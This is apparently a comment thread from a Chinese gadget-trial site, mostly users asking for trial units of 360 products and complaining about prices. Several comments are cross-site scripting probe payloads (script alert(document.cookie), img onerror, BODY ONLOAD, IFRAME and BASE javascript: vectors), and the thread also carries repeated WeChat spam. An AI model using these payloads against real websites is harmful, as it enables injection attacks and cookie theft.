要要要要要要啊！
帅爆了，好喜欢~~~~~~~~~快出来吧~~~~~~~~~~
求人品大爆发啊！中啊  ~~~~ 
 建议把360LOGO去掉，跟普通儿童手表差不多，这样子安全性更高。
http://jia.360.cn/index.html“测试中”的官网。
谢谢了,O(∩_∩)O~
照相功能必须强大才会有竞争力，毕竟现在出门带相机还是比较麻烦不方便，手机虽然也带照相功能但是在夏季来说现在的智能手机个头都不小还是不方便，尤其是对男士来说！既然推出智能手表能够实现打电话. 短信等功能那就必须提高照相的像素不要成为鸡肋！款式和商标洗完设计的更为酷炫，价格实现平民化！顶一个！
设计的再稍微大一点这样电池也会更耐用点，要是这样的话我希望拥有一块！
期待期待，车子总忘记车位 
漏电就完了  还敢买怎么贵  斯坦福叫兽被电了吗
孩子的自由呢？
是0.4万到1万＄     说的好像你很有钱一样
钥匙扣空空的   来个配饰呗   祝产品大卖啦 
有单独的音乐系统就更好了
期待中奖 哦   赞一个  回头就改高德地图
很先进啊，很酷，很喜欢
           我看重缘分
360路由器，每次出来差不多都是被秒杀的，什么时候到我买啊
核电池  ~~能打电话三辈子
看起来不错，赞一个！
期待已久的产品！
美好生活值得拥有
攒人品，求试用！！
&#039;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt; 
&lt;img src=&quot;javascript:alert(&#039;XSS&#039;)&quot;&gt; 
&lt;img src=&quot;javascript:alert(&#039;XSS&#039;)&quot;&gt; 
&lt;BODY ONLOAD=alert(&#039;XSS&#039;)&gt; 
IFRAME src=javascript:alert(&#039;XSS&#039;)&gt;&lt;/IFRAME&gt;
&lt;IFRAME src=javascript:alert(&#039;XSS&#039;)&gt;&lt;/IFRAME&gt;
&lt;BASE href=&quot;javascript:alert(&#039;XSS&#039;);//&quot;&gt; 
只想拥有啊
很希望能试用这个手环:)
作为首批众筹支持者再次支持下，期待收货哦~~~HH 
好想要一个！大赞啊~~
玩游戏估计很爽
期待中奖 哦 赞一个 回头就改高德地图
期待ing
感觉挺好玩的，什么时候可以购买？
应该比较贵
wo zhidao le!
期待能有一个，好喜欢
为什么不连接云盘功能。
可以对话就更好啦，
很棒的设计 ！给个赞
背板可以做成镂空的，网格状，既节省了料又有利于手机散热
好需要的希望中奖，回头换高德！ 
这个和适应，尤其作为无线呼叫，方便在难于布线的场合使用，很赞
都是有钱人的玩具，平民只能叹为观止
我想要这么好的产品,希望能中
终于发了、等的花儿也谢了
终于等到了 
智能家居时代即将来临
等了一万年 
推荐了好多朋友来参观奇酷网了，不知道他们有没有参加
中啊中啊！
我想试用啊，等到花儿也谢了
继续支持奇酷，选我，选我，选我。
好高端啊，很想体验一下
哇哦 写得太赞了！！！图片超棒
什么时候开始啊   我也想试用啊~~~~~~~~~
哈哈 建议图片以后可以再做下排版 赞一个！！
图片 能否再多一点。。？楼主
期待持续更新..
好东西啊 ,期待中            
推荐了好多朋友来参观奇酷网了，不知道他们有没有参加。 不过我一定要中啊，希望我人品爆发 
手表多久可以开卖 开售呀？？？
希望得到试用资格  
我推荐了好多朋友来注册奇酷网了，也希望我能中  
申请试用成功了，希望能选中我。哈哈，我会让身边的人都来买
这么贵，估计都花在防漏电上了
这也可以放心地交到孩子手上?紫外线照射的结果大家应该明白
不是已经量产了么，什么时候开售啊
这个产品真的设计的很好，希望这次能让我也试用一下。
好希望有一台，期待中
啊   为什么还没有开启,孩子妈都要去上班了, 都等着呢
很方便实用的儿童安全手表，强烈推荐给宝宝的爸爸妈妈们
到处都是辐射，还辐射到嘴里了，给个激励有什么用。好好安心刷牙就好
我有个网络摄像头，不知这款有没有突破。等小米生产，没想到360提前了。顺便提一下，说实话，360产品外观很一般，随身wifi山寨感很强，质感很糟糕，过时的设计。这个水滴做成玻璃材质，我觉得更好。
好想要啊！！！
很详细很客观很实在很给力很搞笑的评测，赞一个！
真的好像有
真的好想有
我也想试试，不过这个好像只是室内使用的，可以当做户外摄像头吗！？
很不错 期待
一直都想要的一款产品，我已近比较了很多了，什么小度耳目，中兴小兴
呃……还有什么需要看的图片么？提一下，然后我拍照上传
希望我能中
太贵了，好东西
必须有电脑才行啊~垃圾
超酷的！大陆什么时候上市
很喜欢 也实用，希望能快一点面市。
等待中。很想买一个。
可以放在脸颊当泪水蛊惑人心~可以放在你头上的旋骚扰你~可以打开你的瑞士表把它放进去让表长锈~可以在你睡觉的时候放在你的鼻孔里呛你一下下~最后建议科学家利用高科技把它做成“水钻”戒指送给我呵呵
亲 我想问问 一代是和二代一起寄来的吗 还是你这么幸运一二代都让你领导试用资格 你是神仙啊
很想拥有，支持 
培养越来越多的懒人了
一定要中啊。
谢谢哦，这是精品
谢谢哦，此处省略50个字
图片要清晰
支持，好想拥有
有点期待了，看看有什么创新功能，以及实用性如何
功能介绍很强大，非常期待发货。
热切期待，终于来了
好东西，期待可以试用
期待的东东终于有了，期待使用！
这个给力，好期待，
很喜欢这个手环，但愿能中
....中
这个也能叫3D打印（3D笔）？大家都笑了吧。什么叫充数？
一看产品才知道这是以东西，买这个还得有专业技能的人才能用啊，不亲民啊。
不说了，一个词形容：功能强大
这不是仿的oppo n1的小叮当吗……一点创意都没有。
都鸟产了还不卖
期待中~~~~
为什么不加入监督学习的功能？
是啊 学习功能有吗
这么小的东西，能有这么强大的动能，真是没有做不到，只有想不到，好期待拥有。
好用不。好用给我回复我电话17098909168
希望可以一键设置什么的，或者有记忆性的设置
密码什么的最好可以自定义
什么时候可以买哦？期待中
8G的U盘太小了，我愿意出双倍的价格，能做到16G嘛，质量不变。
你好！首先，我们的Ghost轻易上手，告别了复杂的遥控器操作，虽然也有飞机是用app操作但是把手柄遥控器设计到手机app上，其操控的难度不比用手柄操作少；其次，我们的Ghost是手机app通过蓝牙连接通讯盒，通讯盒通过无线数传（433mhz频率）来控制飞行器，通讯距离可达1000米；再次，我们的机身采用的是高强度复合型材料(PC+ABS)，我们测试过从10米的高空掉下来仍旧毫发无伤，稳如泰山
图片设计的好赞！！
谢谢你的支持。我们一定不会让你失望
引用：关于U盘版随身wifi的发热问题，小编有个小小的建议， 添加防尘网膜，像手机听筒上的防尘网膜一样，耐用会增加好几倍
关于U盘版随身wifi的发热问题，小编有个小小的建议， 添加防尘网膜，像手机听筒上的防尘网膜一样，耐用会增加好几倍，外套就可以一钻多点孔了，散热好即防尘。
如果u盘接口3.0,存储有16G到32G
主要调用的是手机上的数据 手机GPS导航信号不怎么好 很鸡肋的设备
你电脑的win8系统能用？我电脑的win8系统怎么插上360wifi之后一直受限呢？
功能介绍很强大 东西到底行不行只有用了才知道！
好像要，不知道我的评论凑不凑效
你电脑的win8系统能用？我电脑的win8系统插上360wifi后一直受限...
你电脑的win8系统能用？我电脑的win8系统插上360wifi后一直受限...
预约了也没买到，怎么总是没货啊？郁闷
360忽悠人呢，等这么久！7月26日（外甥女生日）前买不到改买其他品牌
功能介绍很强大，非常期待拥有
谢谢支持！为了大家的视觉效果，花了很久设计好图片才开始写报告的。只是还有工作要赶，很多idea只能等明天完成工作再加上去~
谢谢支持！为了大家的视觉效果，花了很久设计好图片才开始写报告的。只是还有工作要赶，很多idea只能等明天完成工作再加上去~
谢谢支持！为了大家的视觉效果，花了很久设计好图片才开始写报告的。只是还有工作要赶，很多idea只能等明天完成工作再加上去~
我只能说，太贵了，
这个不错，有点像MOTO360
看了介绍，觉得少了一个自动连接360云盘储存备份功能，要是有了连接360云盘储存录像功能才完美！！！
好想有一个
确实呀,说的太对了 
确实呀,说的太对了 
设计使用方便安全，非常期待能拥有
精品报告，内容写得好是一方面，写的早也占了主要原因。看看人家的阅读量，再看看咱自己的，唉！不过咱还是会用心写出精品的体验报告的
不是说今天12点卖吗！毛线都没有一条，搞什么售卖啊
希望使用一阵后，有更多的发现
很到位，很仔细，态度好认真！！
T3用了这么久有没有什么新的感受，家里的空气质量有没有提高
：）路过  加+
希望我能中 除乐买矿泉水中过再来一瓶 其它都没有怎么中 赐我好运吧 让我试用 如果能像终极三国一样 人物还能刻画出来 那就太太太神奇啦。
好强好强 好爱哟~~
好像要一个啊，等了很久啊
网络摄像头不要成了黑客窃取隐私的工具。或者帮助小偷犯罪的工具。。。总担心安全问题。。。
看上去还可以，不过觉得应该会有死角，希望能得到实物实测
再加个手机otg接口我就买了。。。
是不是只能在电脑上抢 ？手机不可以吗
喔1234
求开发，求内测名额
中啊，很喜欢，中
求测试样机
我喜欢，求试用
希望能直接购买，用了之后再把使用心得写出来，让更多的人了解这个东西不错
抓紧时间开放购买吧。。。。。。。。。。。。。
太贵了，也许我可以自己改装出来
美女写的不错噢！给赞！！！！
安全是最重要的，不知道这一块做的怎么样？期待！
哈哈哈，看的笑死了
设计的初衷是好的，但为了监控的全面一些，估计家里就要多配备几个了。无线连接是趋势啊。
安全问题是最让人关心的，别让他人窥视你的隐私哦。
 科技真是越来越发达了！永远支持奇酷网！ 
感觉这期的报告是质量最高的一期。说明还是产品好。
居然能测出这么的数据？是怎么做到的啊。。。
绿色也蛮漂亮的啊。果然是五彩体重秤啊。
还是360做这类的产品比较靠谱。安全。
海美女应该也同样会给
好想要哦、
非常的期待
什么时候出啊 
一直在等，一直在等，宝宝都快长大了！
不错不错,看起来用心去试了
缺点写的不错哦，没有盲目的赞美。
我要我要啊，好好看啊 
什么时候能买啊
蓝牙的距离有多远啊？
  很喜欢这个外形！期待能快点来！一直在等，一直在等，宝宝都快长大了！ 还是360做这类的产品比较靠谱。安全抓紧时间开放购买吧。。。。。。。。。。。。。一直都想要的一款产品，我已近比较了很多了，什么小度耳目，中兴小兴    什么时候可以买哦？期待中 
憧憬期待等待中~~
非常期待这款产品试用
嗨！您好！我是工业设计专业的，对3D打印技术有一些研究，如需这方面的帮助请留言！谢谢invisibleline@126.com
还是360做这样的产品最靠谱啊。
希望可以抽中 &gt; &lt;
一直在等啊，希望性价比高
不知道能不能在电脑谁看
谢谢支持！~认真写报告才对得起奇酷给的这个试用机会~ O(∩_∩)O
好想要哦。
谢谢！~是你先写的很好，给了大家一个参考~谢谢支持~
是呀。本来没收到的时候好喜欢红色，收到绿色发现也很漂亮！是面板的镜面效果好，各种颜色都好看，让收到的人心情都美美哒~
要多少钱啊  应该买不起。。。
&lt;img src=&quot;&quot; onload=&quot;alert(&quot;test&quot;);&quot;/&gt;
这个看起来不错，关键是识别准确率和操作性上怎么样？
&lt;img src=&quot;pic.gif&quot; onerror=&quot;javascript:alert(&#039;test&#039;);&quot; alt=&quot;pic&quot; /&gt;
这得有多丑啊，而且这是新潮玩意，还是买好的吧。 你说别人戴个moto360或者gear，你戴个这个，是不是有点.... 
%0cimg src=&quot;pic.gif&quot; onerror=&quot;javascript:alert(&#039;test&#039;);&quot; alt=&quot;pic&quot; /%0e
非常好的一篇评测。还有同类产品的展示。一下知道了很多的手环。
这个创意不错
很中肯的试用报告哦，期待后期的持续更新！愿自己也能中一次！
希望抽中~~
一直都在支持着360的活动，就是每次都没有机会
希望很耐摔~
手里有好几个项目，比较忙！这次报告确实写的冲忙了点。不过我会实时更新的，在试用过程中一点点挖掘优缺点。为360儿童卫士的量产贡献自己的力量！谢谢大家的关注哦！
建议把360LOGO去掉，跟普通儿童手表差不多，这样子安全性更高。 
支持360，希望360越做越好
非常期待这种高科技的新产品，最爱这种小巧可爱迷你型的高科技了，方便携带还时尚，强烈要求要，报告会认真对待的
紫外线的确让人担心 
必须开电脑，不然使用不了
手表颜色都很漂亮，并且实用价值高，值得购买
一直很期待啊。。。
亲 你的图片最好居中一下~~
X希望可以抽中啊。。我同学第一次就成功了555555。
快点出来发售把 一定会大买
快点出来发售把 一定会大买
感觉 很强大 
像我这种路痴有了它，简直是户外旅行之利器啊。就是不知电量如何？不过外形还不赖！！
最好再加个读卡器的功能
我会抽中吗？
不错 希望画质很清晰
这个不错，价格不要太贵，可以推广使用，不知电脑上可不可以连接，还有就是如果有空气检测功能更好！
路痴的救星，自从拥有了它，再也不怕迷路了！
好羡慕中签的你啊
这个估计又米有俺的
我觉得有些人说的没有错，这是防三卫视
支持360，我电脑上手机上都用360软件。
希望将图文排整齐一下
写的非常好！图也不错
表面有四个超导性电极片，使用无损伤微弱生物电在体内循环，再通过独特的BIA生物电阻抗方法计算十项体征数据。
这个点名时间上面已经开始预定了，199-399元 要的 赶紧吧！
整蛊利器..............
创意不错，就是不知道，支持那几款机型。还有价格。要是能已其它的智能设备相兼容就更好了。
要是增加 静电除尘那就更好了。
快点制作出来吧
我要买下来 
快点搞出来啥
15年我买这么好玩 
希望可以抽中，好几期了，求。。。。。。
我一定要申请到啊  太喜欢这个东西了  而且十分的需要这个东西
手机要是不能控制摄像头的旋转，就没意思了
这期bong报告 真的是好Bang！！赞
这个是个很好的东西，很实用也很适合我
多参与奇酷的活动，总有一天好运就降临了~O(∩_∩)O
非常喜欢这个
这个什么时候才有得买
越看越喜欢，有小时候看到自己钟意的玩具内种感觉 
还没出来 快等不急了
一个字：吊
第一次啊，求中签！！！
360就是牛    高贵 加油
加油 看好你哟
生活如此健康
看好你哟    加油
最经典的是充电要多久
我一定要申请到啊 太喜欢这个东西了 而且十分的需要这个东西 
期待开放我很看好  
一我想说360真是越来越强大了
这个可以做淘宝代发吗
这个淘宝可以代发吗
这个好，家里有宝宝用得上
啊，写个测评好累啊！希望对大家有帮助。。。。
同类介绍很贴心,作者有心了,不但有评测还有对比分析.赞一个!
宝贝，我好忠意你啊，快到我这来。
http://www.qikoo.com/try#
360就是牛，天天都会有惊喜。
360我看好你
停电了家里其他电器都用不了了，还需要它干嘛啊
可以考虑附加外置移动电源，以在暂时没有电线线路的时候应急使用
这个太方便了！快到碗里来！！！
这个好啊！
在大陆这个肯定上不了路的！
这个真是好！
这个貌似不错。
哈哈东西都很实用 而且价格亲民~~
辛苦辛苦 写得很棒哈！
亲~~已赞！！
哎哟 还有一台Ryfit?
讨厌饥饿营销，赶快出产品吧，馅饼从来也砸不我，我只想买，爱你恨你360
期待你的到来
 希望中签 .
酷毙了，好想要一个
挺详细的。赞一个。~
很好~写得还不错。学习学习
为了健康 “没有花钱的不是”我喜欢这句话！
心动智能 环形天下
豪哥！你中签了！你真厉害。怎么才能中啊。
还没开始怎么就预约结束了？
我也想要一台。
哪里有预约啊？ 
还没开始预约？ 
时间观念被狗吃了？
不是说好10点的吗
F5都按爆了
。。。不准时搞毛啊？ 
是被人抢完了？还是没开始？ 
故意要刷新率吧，，
还没开始吗 
草  没预约到啊
草  没预约到啊
大爷的，怎么不能预约？
应该是没开始。 
没有啊  根本没有开啊！
我已经放弃治疗了，不刷了。
表示 网页每秒 刷新3次  没看到！
终于预约成功了。
预约成功，哈哈哈。。。
吹牛皮？不可能吧？ 
http://www.qikoo.com/luyou 到这里来预约！
还没开始已结束。。。
根本就没开始
汗。还以为可以买了呢。还是要等一个星期
可以预约了，大家加油
预约 成功！ 抢购不知道呢！
http://www.qikoo.com/luyou 已经在这里预约成功，但我就是想不通，这个页面存在的意义就是为了误导么？ 
为身边还是预约结束啊 
预约不了啊
看看下面那个兄弟的网页，那是预约的
谢谢楼下提醒，已经预约成功！
怎么贵了这么多的？
到首页预约，但怎么贵了那么多，不是第一批的价格了，什么说法嘛！！！！！！！！！
今天开始了，不过涨价了 
最好能当无线路由器用
这里预约结束，可是http://www.qikoo.com/luyou 还能预约，什么情况？不是一个系统吗？还是彩蛋？
到底什么时候能开始卖啊？
竟然涨价了啊
我好忠意你啊
额，表示这个东西貌似不错，但是能提一下续航能力吗？充电时间比使用时间还要长的话就没有意义了。 
简单生活，缺一不可啊
求抽中，我也挺喜欢这个产品的   加油~！加油~！
求中，求种
求中，求种
不能实时通话，太鸡肋了！
那边都开始那么久了，这边才开始
很多厂家都有的啦。。。较好的有联想看家宝、三星（忘了型号）、海康威视有萤石系列。。
又！ 逆 天 了
有光纤接口的吗？
我想要啊！这个好东西！
这个对空气净化到底有用吗？ 
很不错，但是怎样能保证别人不窃取我家里的信息？怎样保证360不窃取家里的信息？怎样保证人民警察不窃取家里的信息？
谢谢谢谢，，有肯定就有动力了
三款鞋子均安装锂电池，大约 1.5 小时能够完成一次充电。Rocketskates 最高速度能够达到 12mph(19 km/h)，R6 在充电后可以运行 45 分钟，大约能够行进 6 英里，R8 能够运行 8 英里，R10 则能够达到 10 英里。
价格有点高
关键是用户体验度如何，很想搞一个玩玩，买也行啊。  
立刻申请！
现在知道什么叫万一了，希望被万一到
我觉得也是
别的话别说了，快到碗里来！
非常喜欢,非常喜欢,一定要申请到啊.
写的不错啊
感觉好实用方便，希望能申请到免费试用，送给爸爸
嗯,谢啦!
赞...支持支持...
希望尽快可以买 
顶一个！好
喜欢 ，什么时间能买到呀 
超喜欢  可以买吗 
在那里买？？ 
快快地研发，车都买了，就等它了
错，新车刚买回来，就等这个宝贝下线了，还要多久才能买呢？最看中空气净化甲醛的功效，希望强大些啊。防盗报警齐全点。 
不错，新车刚买回来，就等这个宝贝下线了，还要多久才能买呢？最看中空气净化甲醛的功效，希望强大些啊。防盗报警齐全点。 
现在可以买到吗 好急呀
肯定会抽中的 
文章持续更新中哦~~
你咋不说无线路由器垃圾 必须有网络连接才行 这个东西的原理就部分相当于笔记本上的无线网卡而已 
必须要赞一下。看完就想买一个了。
期待！！期待！！！
能找出这么多小的细节问题，可见你真的非常用心啊。
居然还能对接支付宝。真是不错。
第二轮预约开始了。
各位大神  有水用过了这头一批路由器 好用吗 能覆盖多远
这个不错，很喜欢。
真有这神奇，想感受一下这东东，刚把钱包丢了！
很不错的报告，值得学习一下。
亲~~~~已赞
是我喜欢的类型，赞赞赞
如果想申请成功，建议大家去上传个头像啊。哈哈
我可能更关注这方面的防水性
就一根天线，感觉信号不怎么强，有用过的木啊，给个建议
来看好几天了，，还没结果 ，，我这颗心咋就悬在这了呢？
听起来很棒，但实用性太低了
大插孔，不符合新国标
嗯嗯,谢谢支持!
我再给你32个赞!
我有饭店加入，可以作为公共视频源给大家看
58829个人申请  30个  这希望比渺茫还渺茫，，“小丫小手环”  想说爱你不容易
这个应该是现在年轻人应有的，不知道价位如何
一看就知不是在360上班的就是在麦步请来发图文的 一个普通用户哪有这个空闭去发这么一大堆的东西呀，只有金钱才会让一个人这么卖力的发
只是觉得穿透性不如普通的路由器
这个家庭卫士比竞品“小度i耳目”多了双向语音通话功能，可少了录像云存储，希望360的产品能取长补短，也加上云录像功能
新奇物件~ 
外观不敢恭维，但只要内在配置够好勉强还过得去
之前不是99元吗，怎么贵了一半！！！
写得不错呀，楼主鲍照
喜欢，价位可以的话搞一个
高科技啊，我 O U T 了
360家庭卫士已经升级了，支持遥控巡航，和遥控汽车差不多，支持定时巡航功能。摄像头可360度反转无死角监控。内置3000毫安备用电源，断电一样可以监控，内置16G内存无网络状态下可以暂时储存在本地。结合360云盘无限空间免费云储存。【1年自动清除一次，清除前会提醒，由用户选择删除某时间段监控视频】内置迷你路由直接插网线秒变路由。360将发布更多外壳，让视频监控更具人性，有更多建议请@360家庭卫士
那个与Xbox和ps2,3,4不一样无法与他们相比较，我问你这个游戏机能玩刺客信条2345吗？ 
关键还是材料么
哪里能看？
还行，我买了，还挺划算的
希望能选中！！！！
这  这  这也太  给力 了吧，无语、、
这个就是运动的时候用的吧 可以知道未接电话，要是业务多，你就不要打球了。找手机的功能倒是不错，但是可以用一个电话打另一个电话解决。主要功能是跑步计数，睡眠时间、如果可以测心跳、血压就更好了
看了报告，还是很受启发的，还是很用心的，我也希望有机会试用，谢谢啦。
能帮到你很高兴，希望继续支持奇酷，会有机会的，，，
安卓又被鄙视了。
好期待啊 哈哈 
内地人民币超过三万都不是太好卖了！不实用    两栖车只能够在沿海一带发挥长处！最高能卖到两个大趴的价格！
好想赶紧带着它去跑跑步，试一试
好不 容易等到第二次，怎么价格贵了一半，失望 
真心话：设计风格不太喜欢。能否让他更美观点。更机械更数字更炫酷一些？
有买的趋势 看到了  求中  求幸运
在哪能买到~！？
好想用。期待啊
操！        和第一次的有啥区别？？          为啥贵了一半？？？？？？？？？？？？？？？？？？？？、、？？？？？？？？⊙﹏⊙●︿●╯﹏╰╯﹏╰╮(╯3╰)╭\(&quot;▔□▔)/╮(╯▽╰)╭d(╯﹏╰)b ~~ o(&gt;﹏&lt;)o不要啊！
3D打印笔的重量是多少？大小感觉还是学设计的学生和成人用会比较适手呢。
专业测评30年
期待哦、200美元还能接受.
怎么没看到怎么测量呢？安卓手机适配吗？
期待我能中奖啊，送给我照顾我家小小宝宝5个多月的老婆大人。
过来看了好长时间了，很想有试用的机会。希望这次幸运女神能眷顾我一次。
希望明天幸运之神能够降落在我的身上，看看能不能在试用中找到问题，去拿奖金。
这个一定很有市场！土豪们有花钱的理由了
我住在员工寝室有必要按个摄像头 怕我一出门 值班的人进来搞什么~~~ 
弱弱的问句 有效距离是多少米？
用过第一批的朋友，我想问下，这款360路由器在无线路由器多的小区环境情况下，有干扰吗？不在同一个房间，网速损耗多吗？
很期待可以得到试用
第一批路过  信号比TP841好一点
迫不及待想立刻立刻拥有
好期待，申请了好多期了，没有中过，不知道有没有中的
升级版还可以用作路由器，什么价格？？我正需要 
很期待360所有产品
期待此产品
哈哈 真心的很想体验。我会写好体验报告的！
期待呀···希望这次有机会拿到啊
求中一次。 
赐我好运吧 让我试用，好几期没中，希望这次能成功！！！
期待啊 不错的产品！
可以使用一下~~~~~~~~~~~~
送上32个赞   赞赞赞赞赞赞赞赞赞赞赞赞赞赞赞赞赞赞赞赞赞赞赞赞赞赞赞赞赞赞赞赞
好想用。期待啊 
到处都是说贵贵贵。。。你们有没有想过树木草花正在努力洗空气  我觉得该买电动。。
用电的，续航力是个问题
人人都需要
百度有小度i耳目，联想有看家宝，希望360的家庭卫士后来居上。 1、远程监控、控制； 2、云端摄像、录相及云盘存储； 3、画质质量可调； 4、报警提示模式选择； 5、增加可配置的门窗传感器，对预设时间内的异常动作、声响进行报警； 6、有夜视功能； 7、天气播报以及随心听功能； 8、外接U盘存储； 9、与客户端的一键呼应功能，简单启动想聊就聊； 10、安全校验，保证隐私。
哎 无语~~~~~~~~~~~~
3000毫安备用电源，断电一样可以监控，可是断电怎么有网络啊，手机上怎么可以查看啊
亲，这是高德的，不是360的哦
样子真小气，能外接硬盘否？或者云存储？
好期待啊   我想要试用 啊
申请了好多期了 一直没收到过？
赐我好运吧 让我试用，好几期没中，希望这次能成功！！！ 
那就说明还是不错的啊。
这个必须赞
想进一步了解产品的，请关注豆芽科技官方微信号 ：【豆芽健康】ID：douyajiankang 
就想要这样一个东东
抱着试试的心态来申请，看看运气好不好
想进一步了解豆芽智能体温计吗，请关注豆芽科技官方微信号 ：【豆芽健康】ID：douyajiankang  
想进一步了解豆芽智能体温计吗，请关注豆芽科技官方微信号 ：【豆芽健康】ID：douyajiankang  
想进一步了解豆芽智能体温计吗，请关注豆芽科技官方微信号 ：【豆芽健康】ID：douyajiankang  
想进一步了解豆芽智能体温计吗，请关注豆芽科技官方微信号 ：【豆芽健康】ID：douyajiankang  
想进一步了解豆芽智能体温计吗，请关注豆芽科技官方微信号 ：【豆芽健康】ID：douyajiankang  
豆芽智能体温计以准备量产了哦，想进一步了解吗，请关注豆芽科技官方微信号 ：【豆芽健康】ID：douyajiankang  
赶快到我碗里来
关于豆芽智能体温计价格和产品上市时间可以关注都豆芽科技官方微信号【豆芽健康】ID:douyajiankang  向我们咨询。
市场上类似的产品有很多,基本在1000元左右 附带APP 其实 现阶段 也就是玩个新奇
快点搞出来把，心痒痒了！我觉得这样的手机防盗最重要离开多少米就能发出声音，什么安全软件都不够这个实际哦！！！
一定要无线充电，轮胎要会有避震功能以及可以收缩上下的 
功能很强大，值得拥有，很期待
你可以直接买一个智能机
想更多了解豆芽智能体温计吗（价格、产品上市时间、购买渠道等），请关注豆芽科技官方微信号【豆芽健康】ID:douyajiankang   
想更多了解豆芽智能体温计吗（价格、产品上市时间、购买渠道等），请关注豆芽科技官方微信号【豆芽健康】ID:douyajiankang   
想更多了解豆芽智能体温计吗（价格、产品上市时间、购买渠道等），请关注豆芽科技官方微信号【豆芽健康】ID:douyajiankang   
想更多了解豆芽智能体温计吗（价格、产品上市时间、购买渠道等），请关注豆芽科技官方微信号【豆芽健康】ID:douyajiankang   
想更多了解豆芽智能体温计吗（价格、产品上市时间、购买渠道等），请关注豆芽科技官方微信号【豆芽健康】ID:douyajiankang   
想更多了解豆芽智能体温计吗（价格、产品上市时间、购买渠道等），请关注豆芽科技官方微信号【豆芽健康】ID:douyajiankang   
想更多了解豆芽智能体温计吗（价格、产品上市时间、购买渠道等），请关注豆芽科技官方微信号【豆芽健康】ID:douyajiankang   
想更多了解豆芽智能体温计吗（价格、产品上市时间、购买渠道等），请关注豆芽科技官方微信号【豆芽健康】ID:douyajiankang   
想更多了解豆芽智能体温计吗（价格、产品上市时间、购买渠道等），请关注豆芽科技官方微信号【豆芽健康】ID:douyajiankang   
想更多了解豆芽智能体温计吗（价格、产品上市时间、购买渠道等），请关注豆芽科技官方微信号【豆芽健康】ID:douyajiankang   
想更多了解豆芽智能体温计吗（价格、产品上市时间、购买渠道等），请关注豆芽科技官方微信号【豆芽健康】ID:douyajiankang   
想更多了解豆芽智能体温计吗（价格、产品上市时间、购买渠道等），请关注豆芽科技官方微信号【豆芽健康】ID:douyajiankang   
想更多了解豆芽智能体温计吗（价格、产品上市时间、购买渠道等），请关注豆芽科技官方微信号【豆芽健康】ID:douyajiankang   
想更多了解豆芽智能体温计吗（价格、产品上市时间、购买渠道等），请关注豆芽科技官方微信号【豆芽健康】ID:douyajiankang   
想更多了解豆芽智能体温计吗（价格、产品上市时间、购买渠道等），请关注豆芽科技官方微信号【豆芽健康】ID:douyajiankang   
想更多了解豆芽智能体温计吗（价格、产品上市时间、购买渠道等），请关注豆芽科技官方微信号【豆芽健康】ID:douyajiankang   
想更多了解豆芽智能体温计吗（价格、产品上市时间、购买渠道等），请关注豆芽科技官方微信号【豆芽健康】ID:douyajiankang   
看你妹，把我儿子当傻子。                 娆㈣繋鏉ヤ笂鎴?                                                                        zmxn12580                                                   
想更多了解豆芽智能体温计吗（价格、产品上市时间、购买渠道等），请关注豆芽科技官方微信号【豆芽健康】ID:douyajiankang   
想问下，要放罢在什么位置，电器才能接收到信号？
什么时候可以买啊》？？
希望可以中 十五字十五字十五字十五字十五字十五字十五字十五字十五字十五字十五字十五字十五字十五字十五字十五字十五字十五字十五字十五字十五字十五字十五字十五字十五字十五字十五字十五字十五字十五字十五字十五字十五字十五字十五字十五字十五字十五字十五字十五字十五字十五字十五字十五字十五字十五字十五字十五字十五字十五字十五字十五字十五字十五字十五字十五字十五字十五字十五字十五字十五字十五字
不带这样抄图的吧。。
不就是能在电视上玩手机游戏么....这叫啥创新..还没我们以前玩的小霸王技术含量高...
还有一天就要揭晓答案了。。希望好运降临。。一直都支持奇酷。各种互动~期待明天。。
放在3楼窗户信号“标准”设置，楼下60米处信号满满；房间内路由器放在拐角处‘强信号‘设置，90平米房间，最差处也是两格信号。最强信号设置3楼，楼梯间1楼也有信号，信号显示1或2格。这是我曾经的测试。
真的很想拥有一个！
航行时间太短      感觉很重的样子
我叫臻，臻络公司让我通过申请吧
可以换成近视镜片吗
这个产品外壳 是我们公司生产的   已生产好几千台了。
8*8的超级玛丽的感觉啊。
超喜欢啊。。。。
这是我上次申请写的报告http://www.qikoo.com/try/paper?id=53c2abf9c84a8af26400011f 很认真的~ 让我中签吧~ 一定认真的进行测试~ 对得起试用产品~ 真的好喜欢的说~
加油啊，期待啊 
怎么涨价了？ 
之前不是99吗？ 
可以移动办公了 
朋友跟我打赌，如果我中，他去操场裸奔十圈！
功能很强大  真的很想拥有一个！ 
有同感。感觉设计上没有那么美观。
设计画图必备啊 
排版很好。感觉实物介绍的有点少，只有两张图片，APP介绍详细，支持一下。
这个插座确实挺漂亮的。想拥有一个。
马上就开始第一波公测试用了。估计很快就能买到了。
毒啊！！！
想使用下看看
我没有申请到过
大哥，确实有卖出，我抢到了一个，想再抢多一个，已经是没有了，前后不超过十五秒钟。
手机也可以，但，你的手机要够快，要不然，抢不过电脑。 
今天刚抢过，等下次吧 
为了申请这个 狠心换了手机 不知道结果如何
一直都支持关注奇酷，真心很喜欢，选我你赚到了。臻络科技加油吧，研制出更高，更好的产品，要努力。
壹见倾心。
是啊，我上次也没抢到，又涨价了 
这个不错 说不定还可以用作行车记录仪器呢
好东西啊 要是价格便宜点就好了
16G内存先存在本机里的！
我叫X臻，臻络公司让我通过申请吧 
我想问下这个必须要有无线网络连接或者网线连接才能使用么？
希望可以抽中！
这东西我感觉不可能做到。
这么多人抢200个名额，太难了，完全靠运气！
让视频监控更具人性，有更多建议请@360家庭卫士 
会么会么。。。。我还以为以经抽出来了。。。
这个啥时可以开始申请试用呀，看起来不错！
太tm好了
APP功能介绍以后补充
感觉这玩意技术还不成熟呀！
一下涨了50 
再祈祷一次，晚安~
这个毛玩意我多年前就想到了  但是没能力实现它  现在又了。。。。
今天怎么时候开始抢的，我居然不知道。
一直都支持关注奇酷，真心很喜欢,希望可以抽中！ 
好像买一个哦。
必须要一个放在家里用啊。。。上班再也不用担心家里了，yeah
投影技术，不是很难的，期待上市啊
这是要扫荡的节奏啊
希望支持的功率能大一点
这个可以有，带感应录像吧，自动检测画面录像
有心率检测吗
好想要呀，超赞  我要是有了它哎呀   ....  
明知山有虎 偏向虎山行
呵呵。。认真写建议也不会被抽到，这还是太虚了啊，不玩这种运气游戏了 微信公布结果了，这边还显示筛选中...
你懂不懂这2200瓦的意思啊
现在家里有监控，分辨率不高，正打算更换，正好，可以试用这个，可以的话就留下！
太好的创意了！绝对万分的支持！
直接兼售卖吧，诚招五卫士哥看家！
不适用，只能引起一时的兴趣，希望以后能像钢铁侠里面的一样。
驴友的装备啊，不错，这个一定要，价格啊！！！！
钢铁侠.......
功能不错，希望能得到一个试用机会。
